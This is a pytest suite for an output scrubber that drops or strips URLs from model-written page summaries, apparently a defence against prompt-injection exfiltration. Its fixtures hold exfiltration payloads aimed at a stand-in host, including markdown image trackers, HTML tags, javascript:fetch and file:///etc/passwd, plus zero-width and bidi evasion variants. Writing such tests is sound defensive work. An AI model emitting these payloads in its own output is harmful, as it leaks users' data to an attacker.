"""The control. If this suite is weak, the whole boundary is decorative."""

import random
import re
import string

import pytest

from hearthfetch.scrub_out import (
    MAX_CONTENT_CHARS,
    DistillationDropped,
    DropReason,
    scrub,
)

EXFIL = "https://evil.example/collect?d=SECRET"

# Every way a distillation might try to carry a destination out.
OUTPUT_CORPUS = {
    "markdown_image": f"The page explains X. ![tracker]({EXFIL})",
    "markdown_link": f"The page explains X. [click here]({EXFIL})",
    "reference_definition": f"The page explains X.\n\n[ref]: {EXFIL}",
    "reference_use": "The page explains X. [see this][ref]\n\n[ref]: https://evil.example/x",
    "angle_autolink": f"The page explains X. <{EXFIL}>",
    "bare_url": f"The page explains X. See {EXFIL}",
    "scheme_relative": "The page explains X. See //evil.example/collect",
    "data_url": "The page explains X. ![](data:text/html;base64,PHNjcmlwdD4=)",
    "javascript_url": "The page explains X. [go](javascript:fetch('//evil.example'))",
    "file_url": "The page explains X. See file:///etc/passwd",
    "mailto": "The page explains X. Write to mailto:collect@evil.example",
    "raw_html_img": f'The page explains X. <img src="{EXFIL}">',
    "raw_html_anchor": f'The page explains X. <a href="{EXFIL}">here</a>',
    "www_host": "The page explains X. Visit www.evil.example/collect",
    "bare_hostname": "The page explains X. Visit evil.com for more.",
    "host_with_path_unlisted_tld": "The page explains X. Visit evil.zz/collect for more.",
    "uppercase_scheme": "The page explains X. HTTPS://EVIL.EXAMPLE/collect",
}

# The same payloads, hidden so a single pass would miss them.
EVASION_CORPUS = {
    "tag_split_scheme": 'The page explains X. htt<b>p</b>s://evil.example/collect',
    "zero_width_split": "The page explains X. https\u200b://evil.example/collect",
    "bidi_obscured": "The page explains X. \u202ehttps://evil.example/collect\u202c",
    "fullwidth_scheme": "The page explains X. \uff48\uff54\uff54\uff50\uff1a//evil.example/x",
    "nested_markdown": f"The page explains X. [![img]({EXFIL})]({EXFIL})",
    "html_wrapped_url": f"The page explains X. <span>{EXFIL}</span>",
}

# Ordinary distillations. None may be dropped.
LEGITIMATE = {
    "plain_summary": "The article reports that the bridge reopened on Tuesday after repairs.",
    "with_numbers": "Version 3.14 was released; it fixes 12 bugs and adds 2 features.",
    "with_filenames": "The guide edits config.yaml and runs deploy.sh, then checks main.py.",
    "with_punctuation": "It covers three topics: cost, timing, and risk -- in that order.",
    "with_quotes": 'The author calls it "a modest improvement" and nothing more.',
    "multiline": "The page lists three findings.\n\nThe first concerns rainfall.\n\nThe second concerns soil.",
    "abbreviations": "Use e.g. a wrench, i.e. an adjustable one, per the manual.",
    "decimal_versions": "Supported on 1.2.3 and later; 1.2.2 reached end of life.",
}


@pytest.mark.parametrize("name", sorted(OUTPUT_CORPUS))
def test_no_destination_survives(name):
    """Either scrubbed clean, or dropped. Never returned carrying a URL."""
    try:
        result = scrub(OUTPUT_CORPUS[name])
    except DistillationDropped:
        return
    assert "evil.example" not in result
    assert "://" not in result


@pytest.mark.parametrize("name", sorted(EVASION_CORPUS))
def test_evasion_is_caught_at_the_fixed_point(name):
    try:
        result = scrub(EVASION_CORPUS[name])
    except DistillationDropped:
        return
    assert "evil.example" not in result
    assert "://" not in result


@pytest.mark.parametrize("name", sorted(LEGITIMATE))
def test_ordinary_distillations_are_not_dropped(name):
    result = scrub(LEGITIMATE[name])
    assert result.strip()


def test_a_distillation_carrying_a_destination_is_dropped_not_cleaned():
    """Reject rather than clean: the distiller was told to emit no URLs, so one
    appearing means the model went off-spec or a page steered it. Either way the
    whole distillation is untrustworthy, and cleaning it would give an attacker
    a free attempt per URL form the strippers happen not to know."""
    with pytest.raises(DistillationDropped) as caught:
        scrub("The page explains X. [click here](https://ok.example/a)")
    assert caught.value.reason is DropReason.DESTINATION_PRESENT


def test_a_path_less_bare_host_is_stripped_rather_than_dropped():
    """The ambiguous case. Models mention sites in passing and it carries no
    payload, so dropping every such distillation costs answers for nothing."""
    result = scrub("The page explains X, according to wikipedia.org reporting.")
    assert "wikipedia.org" not in result
    assert "The page explains X" in result


def test_the_gate_drops_even_if_stripping_regresses(monkeypatch):
    """Fail-closed, proven in isolation.

    The strippers are broad enough that the gate rarely fires in practice, which
    is exactly why it needs testing on its own: if a future edit weakens a
    stripper, this is what still stands between a URL and the caller.
    """
    import hearthfetch.scrub_out as module

    monkeypatch.setattr(module, "_strip_once", lambda text: text)
    # Neutralise the destination gate too, so only the final assertion is left
    # standing. Both layers must independently refuse to return a URL.
    monkeypatch.setattr(module, "_DESTINATION", re.compile(r"(?!x)x"))
    with pytest.raises(DistillationDropped) as caught:
        module.scrub(f"The page explains X. {EXFIL}")
    assert caught.value.reason is DropReason.URL_SURVIVED


def test_the_destination_gate_fires_before_stripping_can_hide_the_evidence():
    with pytest.raises(DistillationDropped) as caught:
        scrub(f"The page explains X. {EXFIL}")
    assert caught.value.reason is DropReason.DESTINATION_PRESENT


def test_a_path_less_bare_host_on_an_unlisted_tld_is_a_known_gap():
    """Documented, not silently tolerated.

    `evil.zz` with no path survives: catching it needs the full IANA TLD list,
    which then rejects `deploy.sh` and `notes.md`. Stage four is the layer that
    handles a destination named in prose.
    """
    assert "evil.zz" in scrub("The page explains X. Ask at evil.zz sometime.")


def test_content_is_length_capped():
    assert len(scrub("word " * 5000)) <= MAX_CONTENT_CHARS


def test_a_distillation_that_is_only_a_url_is_dropped_not_emptied():
    with pytest.raises(DistillationDropped):
        scrub("https://evil.example/collect")


# ---------------------------------------------------------------- property test

def _random_prose(rng):
    words = ["the", "page", "reports", "that", "rainfall", "rose", "in", "March", "and", "fell"]
    return " ".join(rng.choice(words) for _ in range(rng.randint(5, 40)))


def _random_url(rng):
    host = "".join(rng.choice(string.ascii_lowercase) for _ in range(rng.randint(3, 10)))
    tld = rng.choice(["com", "org", "net", "io", "example"])
    scheme = rng.choice(["https://", "http://", "//", ""])
    return f"{scheme}{host}.{tld}/{''.join(rng.choice(string.ascii_letters) for _ in range(6))}"


URLISH = re.compile(
    r"://|(?<![\w:])//[A-Za-z0-9]"
    r"|\b[a-z0-9-]+\.(?:com|org|net|io)\b"
    r"|\b[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9-]+)+/",
    re.IGNORECASE,
)


@pytest.mark.parametrize("seed", range(300))
def test_property_no_third_outcome(seed):
    """For prose with a URL anywhere in it: clean output, or a drop. Never both-ish."""
    rng = random.Random(seed)
    prose = _random_prose(rng)
    url = _random_url(rng)
    words = prose.split(" ")
    at = rng.randint(0, len(words))
    text = " ".join(words[:at] + [url] + words[at:])

    try:
        result = scrub(text)
    except DistillationDropped:
        return
    assert not URLISH.search(result), f"survivor in {result!r} from {text!r}"
